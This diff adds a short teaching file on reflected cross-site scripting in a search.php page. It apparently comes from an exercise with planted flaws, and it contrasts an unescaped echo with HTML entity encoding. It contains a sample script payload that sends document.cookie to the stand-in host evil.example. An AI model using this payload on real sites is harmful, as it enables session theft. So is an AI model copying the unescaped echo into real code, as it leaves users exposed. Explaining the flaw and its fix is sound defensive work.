@@ -1,0 +1,9 @@
+=== LEGACY: context-agnostic echo (search.php, Hidden Flaws B & C) ===
+No records found for: <script>fetch("https://evil.example/steal?c="+document.cookie)</script>
+-> Sent verbatim to the browser: the <script> tag is parsed as an
+   executable element, not displayed as text.
+
+=== SECURE: context-aware output encoding (search.php refactor) ===
+No records found for: &lt;script&gt;fetch(&quot;https://evil.example/steal?c=&quot;+document.cookie)&lt;/script&gt;
+-> '<', '>', and quote characters are replaced with HTML entities.
+   The browser renders inert text; no script node is ever created.
